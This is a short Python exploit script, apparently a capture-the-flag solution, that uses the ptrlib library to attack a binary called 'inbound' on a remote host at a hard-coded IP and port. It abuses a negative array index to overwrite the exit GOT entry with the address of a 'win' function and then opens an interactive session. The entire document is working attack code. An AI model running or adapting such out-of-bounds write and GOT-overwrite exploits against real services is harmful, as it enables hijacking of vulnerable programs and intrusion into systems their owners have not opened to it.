from ptrlib import *
binary = "./inbound"
elf = ELF(binary)

r = Socket("nc 34.170.146.252 51979")

slot = elf.symbol("slot")
printf_got = elf.got("printf")
exit_got = elf.got("exit")

print(f"{slot:x}, {exit_got:x}")
print(str((slot - exit_got) // 4))
print(hex(elf.symbol("win")))

r.sendlineafter(b"index:", str(-(slot - exit_got) // 4))
r.sendlineafter(b"value", elf.symbol("win"))
r.interactive()
